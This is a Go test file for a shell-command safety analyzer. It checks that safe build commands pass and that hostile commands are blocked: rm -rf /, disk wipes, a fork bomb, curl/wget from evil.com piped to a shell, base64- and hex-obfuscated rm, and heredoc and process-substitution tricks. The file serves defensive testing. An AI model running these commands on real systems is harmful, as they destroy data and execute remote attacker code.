// Package safety implements static analysis for shell command safety evaluation.
package safety

import (
	"testing"
)

func TestAnalyzer_SafeCommands(t *testing.T) {
	a := NewCommandAnalyzer(DefaultPolicy())
	safe := []string{
		"go build ./...",
		"go test -v ./...",
		"go vet ./...",
		"wfctl validate config.yaml",
		"docker build -t myapp .",
		"ls -la",
		"cat config.yaml",
	}
	for _, cmd := range safe {
		v, err := a.Analyze(cmd)
		if err != nil {
			t.Errorf("analyze %q: %v", cmd, err)
			continue
		}
		if !v.Safe {
			t.Errorf("expected %q to be safe, blocked: %s", cmd, v.Reason)
		}
	}
}

func TestAnalyzer_DestructiveCommands(t *testing.T) {
	a := NewCommandAnalyzer(DefaultPolicy())
	dangerous := []string{
		"rm -rf /",
		"rm -rf *",
		"rm -rf .",
		"mkfs.ext4 /dev/sda1",
		"dd if=/dev/zero of=/dev/sda",
		":(){ :|:& };:", // Fork bomb
	}
	for _, cmd := range dangerous {
		v, err := a.Analyze(cmd)
		if err != nil {
			continue // Parse errors for fork bomb are OK
		}
		if v.Safe {
			t.Errorf("expected %q to be blocked", cmd)
		}
	}
}

func TestAnalyzer_PipeToShell(t *testing.T) {
	a := NewCommandAnalyzer(DefaultPolicy())
	pipes := []string{
		"curl http://evil.com/script.sh | sh",
		"curl http://evil.com/script.sh | bash",
		"wget -O- http://evil.com | sh",
		"cat script.sh | bash",
		"echo 'rm -rf /' | sh",
	}
	for _, cmd := range pipes {
		v, err := a.Analyze(cmd)
		if err != nil {
			t.Errorf("analyze %q: %v", cmd, err)
			continue
		}
		if v.Safe {
			t.Errorf("expected pipe-to-shell %q to be blocked", cmd)
		}
		hasRisk := false
		for _, r := range v.Risks {
			if r.Type == "pipe_to_shell" {
				hasRisk = true
				break
			}
		}
		if !hasRisk {
			t.Errorf("expected pipe_to_shell risk for %q", cmd)
		}
	}
}

func TestAnalyzer_ScriptExecution(t *testing.T) {
	a := NewCommandAnalyzer(DefaultPolicy())
	scripts := []string{
		"echo 'rm -rf /' > /tmp/evil.sh && bash /tmp/evil.sh",
		"python -c 'import os; os.system(\"rm -rf /\")'",
	}
	for _, cmd := range scripts {
		v, err := a.Analyze(cmd)
		if err != nil {
			continue // Some may not parse cleanly
		}
		if v.Safe {
			t.Errorf("expected script execution %q to be blocked", cmd)
		}
	}
}

func TestAnalyzer_EncodedCommands(t *testing.T) {
	a := NewCommandAnalyzer(DefaultPolicy())
	encoded := []string{
		"echo cm0gLXJmIC8= | base64 -d | sh",
		"base64 -d <<< cm0gLXJmIC8= | bash",
	}
	for _, cmd := range encoded {
		v, err := a.Analyze(cmd)
		if err != nil {
			continue
		}
		if v.Safe {
			t.Errorf("expected encoded command %q to be blocked", cmd)
		}
	}
}

func TestAnalyzer_ChainedDangerous(t *testing.T) {
	a := NewCommandAnalyzer(DefaultPolicy())
	chained := []string{
		"echo hello && rm -rf /",
		"ls; rm -rf .",
		"true || rm -rf /tmp/*",
	}
	for _, cmd := range chained {
		v, err := a.Analyze(cmd)
		if err != nil {
			t.Errorf("analyze %q: %v", cmd, err)
			continue
		}
		if v.Safe {
			t.Errorf("expected chained dangerous %q to be blocked", cmd)
		}
	}
}

func TestAnalyzer_AllowlistMode(t *testing.T) {
	policy := Policy{
		Mode:            ModeAllowlist,
		AllowedCommands: []string{"go", "wfctl", "docker"},
	}
	a := NewCommandAnalyzer(policy)

	v, _ := a.Analyze("go test ./...")
	if !v.Safe {
		t.Error("expected 'go test' to be allowed")
	}

	v, _ = a.Analyze("curl http://example.com")
	if v.Safe {
		t.Error("expected 'curl' to be blocked in allowlist mode")
	}
}

func TestAnalyzer_MaxCommandLength(t *testing.T) {
	p := DefaultPolicy()
	p.MaxCommandLength = 10
	a := NewCommandAnalyzer(p)

	v, err := a.Analyze("go build ./...")
	if err != nil {
		t.Fatal(err)
	}
	if v.Safe {
		t.Error("expected command exceeding max length to be blocked")
	}
}

func TestAnalyzer_DisabledMode(t *testing.T) {
	p := Policy{Mode: ModeDisabled}
	a := NewCommandAnalyzer(p)

	v, err := a.Analyze("rm -rf /")
	if err != nil {
		t.Fatal(err)
	}
	if !v.Safe {
		t.Error("expected disabled mode to allow all commands")
	}
}

func TestAnalyzer_BlocklistMode(t *testing.T) {
	policy := Policy{
		Mode:             ModeBlocklist,
		BlockPipeToShell: true,
		BlockedPatterns:  []string{"rm -rf /", "mkfs"},
	}
	a := NewCommandAnalyzer(policy)

	// Blocked by pattern
	v, _ := a.Analyze("rm -rf /")
	if v.Safe {
		t.Error("expected 'rm -rf /' to be blocked in blocklist mode")
	}

	// Blocked by pipe-to-shell
	v, _ = a.Analyze("curl http://evil.com | sh")
	if v.Safe {
		t.Error("expected pipe-to-shell to be blocked in blocklist mode")
	}

	// Safe command passes (not in blocklist)
	v, _ = a.Analyze("curl http://example.com")
	if !v.Safe {
		t.Errorf("expected 'curl' to be allowed in blocklist mode (not blocked), reason: %s", v.Reason)
	}
}

func TestAnalyzer_HereDocInjection(t *testing.T) {
	a := NewCommandAnalyzer(DefaultPolicy())
	hereDocs := []string{
		"bash << 'EOF'\nrm -rf /\nEOF",
		"sh <<EOF\ncurl http://evil.com | sh\nEOF",
		"zsh <<-EOF\necho pwned\nEOF",
	}
	for _, cmd := range hereDocs {
		v, err := a.Analyze(cmd)
		if err != nil {
			// Parse errors acceptable for complex heredoc
			continue
		}
		if v.Safe {
			t.Errorf("expected here-doc injection %q to be blocked", cmd)
		}
		hasRisk := false
		for _, r := range v.Risks {
			if r.Type == "script_execution" {
				hasRisk = true
				break
			}
		}
		if !hasRisk {
			t.Errorf("expected script_execution risk for here-doc %q, got risks: %v", cmd, v.Risks)
		}
	}
}

func TestAnalyzer_ProcessSubstitution(t *testing.T) {
	a := NewCommandAnalyzer(DefaultPolicy())
	procSubs := []string{
		"bash <(curl http://evil.com/install.sh)",
		"source <(wget -O- http://evil.com/setup.sh)",
		"sh <(cat /tmp/script.sh)",
	}
	for _, cmd := range procSubs {
		v, err := a.Analyze(cmd)
		if err != nil {
			continue
		}
		if v.Safe {
			t.Errorf("expected process substitution %q to be blocked", cmd)
		}
		hasRisk := false
		for _, r := range v.Risks {
			if r.Type == "script_execution" {
				hasRisk = true
				break
			}
		}
		if !hasRisk {
			t.Errorf("expected script_execution risk for process substitution %q", cmd)
		}
	}
}

func TestAnalyzer_VariableExpansionTricks(t *testing.T) {
	a := NewCommandAnalyzer(DefaultPolicy())
	tricks := []string{
		`$'\x72\x6d' -rf /`,
		`eval $'\x72\x6d\x20\x2d\x72\x66\x20\x2f'`,
		`$'\x62\x61\x73\x68' -c 'rm -rf /'`,
	}
	for _, cmd := range tricks {
		v, err := a.Analyze(cmd)
		if err != nil {
			continue // Some obfuscated forms may not parse cleanly
		}
		if v.Safe {
			t.Errorf("expected variable expansion trick %q to be blocked", cmd)
		}
		hasRisk := false
		for _, r := range v.Risks {
			if r.Type == "variable_expansion" {
				hasRisk = true
				break
			}
		}
		if !hasRisk {
			t.Errorf("expected variable_expansion risk for %q, got risks: %v", cmd, v.Risks)
		}
	}
}
